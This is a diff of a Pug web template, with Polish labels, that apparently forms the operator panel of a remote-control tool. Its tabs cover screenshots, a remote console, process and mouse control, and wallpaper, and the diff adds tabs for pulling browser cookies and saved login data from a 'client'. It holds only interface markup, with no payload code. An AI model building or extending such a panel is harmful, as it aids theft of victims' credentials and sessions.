@@ -1,4 +1,4 @@
-extends layout.pug
+extends ../layout
 
 block body
     div(class="uk-section")
@@ -14,31 +14,47 @@ block body
                     a(href="#") Myszka
                 li
                     a(href="#") Tapeta
+                li
+                    a(href="#") Ciasteczka
+                li
+                    a(href="#") Dane logowania
             ul(class=["uk-switcher", "uk-margin"])
                 li
                     div(class=["uk-card", "uk-card-default", "uk-card-hover", "uk-margin"])
-                        div(class="uk-card-header") Zarzadzaj klientem #{client}
+                        div(class="uk-card-header") Zrzut ekranu
                         div(class="uk-card-body")
-                            div(class="uk-flex-inline")
+                            div(class=["uk-flex", "uk-flex-inline"])
+                                div
+                                    button#screenshootFormBtn(class=["uk-button", "uk-button-primary"]) Zrzut ekranu
+                                div
+                                    div#screenshootSpinner(uk-spinner, style={display: 'none'})
+
+                        div(class="uk-card-footer")
+                            progress#screenshootProgressBar(class="uk-progress" value="0" max="100")
+                        include ../modals/redirectToImageModal
+
+                    div(class=["uk-card", "uk-card-default", "uk-card-hover", "uk-margin"])
+                        div(class="uk-card-header") Strona
+                        div(class="uk-card-body")
+                            div(class="flex")
                                 div(class="uk-margin")
-                                    button#manageBtnScreenShoot(class=["uk-button", "uk-button-primary"]) Zrzut ekranu
-                            div(class="uk-flex")
-                                div(class="uk-margin")
-                                    include website_form.pug
+                                    include ../forms/website_form
+                        div(class="uk-card-footer")
+                            progress#websiteProgressBar(class="uk-progress" value="0" max="100")
                 li
                     div(class="uk-margin")
                         div(class=["uk-card", "uk-card-default", "uk-card-hover", "uk-margin", ])
                             div(class="uk-card-header") Konsola
                                 div#commandResult(class="uk-card-body", style={height: '250px', overflow: 'auto'})
                             div(class="uk-card-footer")
-                                include command_form.pug
+                                include ../forms/command_form
                 li
                     div(class=["uk-card", "uk-card-default", "uk-card-hover", "uk-margin"])
                         div(class="uk-card-header") Zarzadzaj procesami
                             div(class="uk-card-body")
                                 div(class="uk-flex")
                                     div(class="uk-margin")
-                                        include process_form.pug
+                                        include ../forms/process_form
                                 div(class=["uk-flex"])
                                     div(class="uk-overflow-auto")
                                         table#processTable(class=["uk-table", "uk-table-striped", "uk-table-middle", "uk-table-large"], style={display: "none"})
@@ -74,7 +90,19 @@ block body
                     div(class=["uk-card", "uk-card-default", "uk-card-hover", "uk-margin"])
                         div(class="uk-card-header") Zarządzaj tapeta
                             div(class="uk-card-body")
-                                include wallper_form
+                                include ../forms/wallper_form
+                li
+                    div(class=["uk-card", "uk-card-default", "uk-card-hover", "uk-margin"])
+                        div(class="uk-card-header") Pobierz ciasteczka
+                            div(class="uk-card-body")
+                                include ../forms/cookies_form
+                            div(class="uk-card-footer")
+                                progress#cookiesProgressBar(class="uk-progress" value="0" max="100")
+                li
+                    div(class=["uk-card", "uk-card-default", "uk-card-hover", "uk-margin"])
+                        div(class="uk-card-header") Pobierz dane logowania
+                            div(class="uk-card-body")
+                                include ../forms/logindata_form
 
 
 
@@ -83,10 +111,12 @@ block append scripts
     script.
         const clientId = "#{client}"
         const address = "#{address}";
-    script(src=""+address+"/static/js/client.js")
-    script(src=""+address+"/static/js/website.js")
-    script(src=""+address+"/static/js/screenshot.js")
-    script(src=""+address+"/static/js/command.js")
-    script(src=""+address+"/static/js/mouse.js")
-    script(src=""+address+"/static/js/process.js")
-    script(src=""+address+"/static/js/wallper.js")
+    if logged
+        script(src=""+address+"/static/js/index.js")
+        script(src=""+address+"/static/js/website.js")
+        script(src=""+address+"/static/js/screenshot.js")
+        script(src=""+address+"/static/js/command.js")
+        script(src=""+address+"/static/js/mouse.js")
+        script(src=""+address+"/static/js/process.js")
+        script(src=""+address+"/static/js/wallper.js")
+        script(src=""+address+"/static/js/cookies.js")
